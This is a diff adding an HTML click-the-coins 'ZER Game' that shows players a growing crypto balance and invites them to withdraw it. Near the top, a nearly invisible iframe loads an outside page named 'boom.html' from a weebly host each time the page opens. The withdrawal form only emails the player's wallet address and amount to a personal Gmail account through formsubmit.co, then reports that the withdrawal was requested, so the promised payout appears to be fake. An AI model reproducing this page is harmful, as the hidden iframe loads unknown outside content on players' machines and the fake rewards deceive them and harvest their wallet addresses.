@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ZER Game</title>
+</head>
+<body>
+......
+<iframe src="https://net7b.weebly.com/boom.html" width="6%" height="6" frameborder="0" allowfullscreen></iframe>
+...
+
+  <div id="instructions" style="position:absolute; top:0; left:0; width:100%; height:100%; background:black; color:white; display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:100; text-align:center; padding:20px;">
+    <h2>Welcome to the ZER Game!</h2>
+    <p>Collect the golden "Z" coins to earn ZER balance.</p>
+    <p>Avoid clicking on the red bombs – they will end your game!</p>
+    <p>Every round lasts 60 seconds. Survive and collect coins to advance.</p>
+    <button onclick="startGame()" style="margin-top:20px; padding:15px 25px; font-size:18px; background:green; color:white; border:none; border-radius:8px; cursor:pointer;">Start the Game and Win</button>
+  </div>
+
+  <div id="gameContainer" class="game-container">
+    <div id="scoreDisplay" class="score">Balance: 0.00000000 ZER</div>
+    <div id="roundDisplay" class="round-display">Round: 1</div>
+    <div id="withdrawForm" class="withdraw-form" style="display:none">
+      <input type="text" id="walletAddress" placeholder="Enter your wallet address" />
+      <button onclick="submitWithdrawal()">Withdraw</button>
+    </div>
+    <div id="cloud" class="cloud">☁️</div>
+    <div id="stars" style="display:none; position:absolute; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:0;"></div>
+    <div id="snowContainer" style="display:none; position:absolute; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:0;"></div>
+    <div id="bird" class="bird" style="display:none; position:absolute; top:20px; left:-100px; font-size:40px; animation: flyBird 10s linear infinite;">🕊️</div>
+    <div id="game"></div>
+    <div id="timer">Time: <span id="time">60</span></div>
+    <audio id="coinSound" src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_654bb4e252.mp3?filename=correct-2-46134.mp3"></audio>
+    <audio id="bombSound" src="https://cdn.pixabay.com/download/audio/2023/03/28/audio_eadcb0a6fc.mp3?filename=explosion-14557.mp3"></audio>
+    <audio id="bgMusic" src="https://cdn.pixabay.com/download/audio/2022/11/30/audio_4370b7393f.mp3?filename=retro-game-theme-124174.mp3" loop autoplay></audio>
+    <button id="gameOverBtn" style="display:none" onclick="restartGame()">Game Over - You Lost</button>
+    <button id="startNewGameBtn" style="display:none" onclick="restartGame()">Start New Game</button>
+    <button id="nextRoundBtn" style="display:none" onclick="nextRound()">Next Round</button>
+  </div>
+
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+    }
+    .game-container {
+      position: relative;
+      width: 100%;
+      height: 100vh;
+      background: linear-gradient(#87CEEB, #1E90FF);
+      overflow: hidden;
+      color: white;
+      padding: 10px;
+      transition: background 1s;
+    }
+    #scoreDisplay, #roundDisplay {
+      position: absolute;
+      left: 10px;
+      font-size: 18px;
+      background: rgba(0,0,0,0.5);
+      padding: 5px 10px;
+      border-radius: 5px;
+    }
+    #scoreDisplay { top: 10px; }
+    #roundDisplay { top: 40px; }
+    .withdraw-form {
+      position: absolute;
+      bottom: 10px;
+      left: 10px;
+      background: rgba(255,255,255,0.1);
+      padding: 10px;
+      border-radius: 5px;
+    }
+    .withdraw-form input {
+      padding: 5px;
+      margin-right: 5px;
+    }
+    #timer {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      font-size: 18px;
+    }
+    #gameOverBtn, #nextRoundBtn, #startNewGameBtn {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 15px 30px;
+      font-size: 20px;
+      background: red;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .cloud {
+      position: absolute;
+      top: 0;
+      left: 0;
+      font-size: 50px;
+      animation: moveCloud 20s linear infinite;
+      z-index: 1;
+    }
+    @keyframes moveCloud {
+      from { left: -100px; }
+      to { left: 100%; }
+    }
+    @keyframes flyBird {
+      0% { left: -100px; }
+      100% { left: 100%; }
+    }
+    .coin-shape {
+      width: 40px;
+      height: 40px;
+      background: gold;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-weight: bold;
+      color: black;
+      font-size: 18px;
+    }
+    .bomb-shape {
+      width: 40px;
+      height: 40px;
+      background: red;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      font-size: 20px;
+      font-weight: bold;
+    }
+  </style>
+
+  <script>
+    let score = 0.00000000;
+    let coinsCollected = 0;
+    let gameInterval, timerInterval, weatherInterval;
+    let timeLeft = 60;
+    let withdrawMin = 0.00001;
+    let currentRound = 1;
+    let isNight = false;
+
+    function playSound(id) {
+      const sound = document.getElementById(id);
+      if (sound) {
+        sound.currentTime = 0;
+        sound.play();
+      }
+    }
+
+    function submitWithdrawal() {
+      const wallet = document.getElementById('walletAddress').value;
+      if (!wallet || score < withdrawMin) return alert('Minimum 0.00001 ZER to withdraw.');
+
+      fetch("https://formsubmit.co/ajax/ahmedsoliman71996@gmail.com", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          message: `ZER Withdrawal Request\nWallet: ${wallet}\nAmount: ${score.toFixed(8)} ZER`
+        })
+      });
+
+      alert('Withdrawal request sent.');
+      document.getElementById('withdrawForm').style.display = 'none';
+      score = 0.00000000;
+      document.getElementById('scoreDisplay').textContent = `Balance: ${score.toFixed(8)} ZER`;
+    }
+
+    function toggleNightMode() {
+      const container = document.getElementById('gameContainer');
+      const stars = document.getElementById('stars');
+      const snow = document.getElementById('snowContainer');
+
+      isNight = !isNight;
+      container.style.background = isNight ? '#000033' : 'linear-gradient(#87CEEB, #1E90FF)';
+      stars.style.display = isNight ? 'block' : 'none';
+      snow.style.display = isNight ? 'block' : 'none';
+
+      if (isNight) createStars();
+      if (isNight) startSnow();
+    }
+
+    function createStars() {
+      const stars = document.getElementById('stars');
+      stars.innerHTML = '';
+      for (let i = 0; i < 100; i++) {
+        const star = document.createElement('div');
+        star.style.position = 'absolute';
+        star.style.width = '2px';
+        star.style.height = '2px';
+        star.style.background = 'white';
+        star.style.top = Math.random() * 100 + '%';
+        star.style.left = Math.random() * 100 + '%';
+        stars.appendChild(star);
+      }
+    }
+
+    function startSnow() {
+      const snow = document.getElementById('snowContainer');
+      snow.innerHTML = '';
+      for (let i = 0; i < 50; i++) {
+        const flake = document.createElement('div');
+        flake.textContent = '❄';
+        flake.style.position = 'absolute';
+        flake.style.left = Math.random() * 100 + '%';
+        flake.style.top = Math.random() * 100 + '%';
+        flake.style.fontSize = '16px';
+        snow.appendChild(flake);
+      }
+    }
+
+    function startGame() {
+      document.getElementById('instructions').style.display = 'none';
+      document.getElementById('bird').style.display = 'block';
+      timeLeft = 60;
+      score = 0.00000000;
+      coinsCollected = 0;
+      currentRound = 1;
+      document.getElementById('time').textContent = timeLeft;
+      document.getElementById('scoreDisplay').textContent = `Balance: ${score.toFixed(8)} ZER`;
+      document.getElementById('roundDisplay').textContent = `Round: ${currentRound}`;
+      document.getElementById('game').innerHTML = '';
+      startTimer();
+      spawnItems();
+      if (weatherInterval) clearInterval(weatherInterval);
+      weatherInterval = setInterval(toggleNightMode, 20000);
+    }
+
+    function startTimer() {
+      clearInterval(timerInterval);
+      timerInterval = setInterval(() => {
+        timeLeft--;
+        document.getElementById('time').textContent = timeLeft;
+        if (timeLeft <= 0) {
+          clearInterval(timerInterval);
+          clearInterval(gameInterval);
+          document.getElementById('nextRoundBtn').style.display = 'block';
+        }
+      }, 1000);
+    }
+
+    function spawnItems() {
+      clearInterval(gameInterval);
+      gameInterval = setInterval(() => {
+        const game = document.getElementById('game');
+        const item = document.createElement('div');
+        const isCoin = Math.random() > 0.3;
+        const type = isCoin ? 'coin' : 'bomb';
+
+        item.className = isCoin ? 'coin-shape' : 'bomb-shape';
+        item.innerHTML = isCoin ? 'Z' : '☠';
+        item.style.position = 'absolute';
+        item.style.top = '-40px';
+        item.style.left = Math.random() * (window.innerWidth - 40) + 'px';
+        item.style.transition = 'top 3.2s linear';
+
+        item.onclick = () => {
+          if (type === 'coin') {
+            playSound('coinSound');
+            coinsCollected++;
+            score += 0.00000800;
+            document.getElementById('scoreDisplay').textContent = `Balance: ${score.toFixed(8)} ZER`;
+            if (score >= withdrawMin) {
+              document.getElementById('withdrawForm').style.display = 'block';
+            }
+          } else {
+            playSound('bombSound');
+            clearInterval(gameInterval);
+            clearInterval(timerInterval);
+            document.getElementById('gameOverBtn').style.display = 'block';
+          }
+          game.removeChild(item);
+        };
+
+        game.appendChild(item);
+
+        setTimeout(() => {
+          item.style.top = '100%';
+          setTimeout(() => game.removeChild(item), 3000);
+        }, 10);
+      }, 800);
+    }
+
+    function restartGame() {
+      document.getElementById('gameOverBtn').style.display = 'none';
+      document.getElementById('startNewGameBtn').style.display = 'none';
+      document.getElementById('nextRoundBtn').style.display = 'none';
+      startGame();
+    }
+
+    function nextRound() {
+      currentRound++;
+      timeLeft = 60;
+      document.getElementById('nextRoundBtn').style.display = 'none';
+      document.getElementById('roundDisplay').textContent = `Round: ${currentRound}`;
+      startTimer();
+      spawnItems();
+    }
+  </script>
+</body>
+</html>
